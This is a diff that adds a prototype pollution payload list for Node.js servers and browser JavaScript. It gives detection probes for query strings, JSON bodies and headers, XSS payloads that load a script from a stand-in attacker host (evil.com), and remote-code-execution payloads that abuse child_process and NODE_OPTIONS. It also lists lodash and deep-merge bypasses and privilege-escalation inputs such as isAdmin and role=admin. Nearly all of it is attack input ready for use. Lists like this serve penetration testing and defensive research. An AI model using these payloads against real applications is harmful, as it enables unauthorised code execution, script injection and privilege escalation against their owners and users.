@@ -1,0 +1,85 @@
+# ============================================================
+# Prototype Pollution Payloads
+# Targets: Node.js (server-side), Browser JS (client-side)
+# Inject into: JSON body, query params (?__proto__[x]=y), URL
+# ============================================================
+
+# ---- Detection — Query String ----
+?__proto__[polluted]=yes
+?__proto__.polluted=yes
+?constructor[prototype][polluted]=yes
+?constructor.prototype.polluted=yes
+
+# ---- Detection — JSON Body ----
+{"__proto__": {"polluted": "yes"}}
+{"constructor": {"prototype": {"polluted": "yes"}}}
+{"__proto__.polluted": "yes"}
+{"a": 1, "__proto__": {"polluted": true}}
+
+# ---- Detection — Nested ----
+{"a": {"__proto__": {"polluted": "yes"}}}
+{"a": {"b": {"__proto__": {"polluted": "yes"}}}}
+{"__proto__": {"__proto__": {"polluted": "yes"}}}
+
+# ---- Client-Side XSS via PP ----
+?__proto__[innerHTML]=<img src=x onerror=alert(1)>
+?__proto__[src]=//evil.com/evil.js
+?__proto__[href]=javascript:alert(1)
+?__proto__[onload]=alert(1)
+{"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}}
+{"__proto__": {"src": "//evil.com/evil.js"}}
+
+# ---- Server-Side Node.js RCE via PP ----
+# Via child_process.fork options:
+{"__proto__": {"shell": "/proc/self/exe", "argv0": "console.log(require('child_process').execSync('id').toString())//"}}
+{"__proto__": {"execPath": "/bin/sh", "execArgv": ["-c", "id > /tmp/pwned"]}}
+
+# ---- Node.js — env injection via PP ----
+{"__proto__": {"env": {"NODE_OPTIONS": "--require /proc/self/fd/0"}, "argv0": "node"}}
+{"__proto__": {"NODE_OPTIONS": "--require /tmp/evil.js"}}
+
+# ---- lodash merge bypass ----
+{"constructor": {"prototype": {"polluted": "yes"}}}
+{"__proto__": {"valueOf": {"__proto__": {"polluted": "yes"}}}}
+
+# ---- Deep merge bypass ----
+[{"__proto__": {"polluted": "yes"}}]
+{"a": 1, "b": {"__proto__": {"polluted": "yes"}}}
+
+# ---- URL-Encoded for query string ----
+__proto__[polluted]=yes
+__proto__.polluted=yes
+constructor[prototype][polluted]=yes
+constructor.prototype.polluted=yes
+__proto__[isAdmin]=true
+__proto__[admin]=true
+__proto__[role]=admin
+__proto__[auth]=true
+
+# ---- Common PP to Privilege Escalation ----
+{"__proto__": {"isAdmin": true}}
+{"__proto__": {"admin": true}}
+{"__proto__": {"role": "admin"}}
+{"__proto__": {"authenticated": true}}
+{"__proto__": {"authorized": true}}
+{"__proto__": {"user": {"role": "admin"}}}
+{"__proto__": {"bypass": true}}
+{"__proto__": {"debug": true}}
+
+# ---- PP via HTTP Headers ----
+# If app merges headers into object:
+X-Custom-Proto: __proto__
+X-Custom-Val: {"polluted":true}
+
+# ---- Gadget Chains (Node.js specific) ----
+# body-parser, express, qs library:
+a[__proto__][polluted]=yes
+a.__proto__.polluted=yes
+
+# qs library (url query parsing):
+?a[__proto__][polluted]=yes&a[__proto__][debug]=true
+
+# ---- Detection Verification ----
+# After injection, test:
+?check={}.__proto__.polluted
+# If returns "yes" → vulnerable
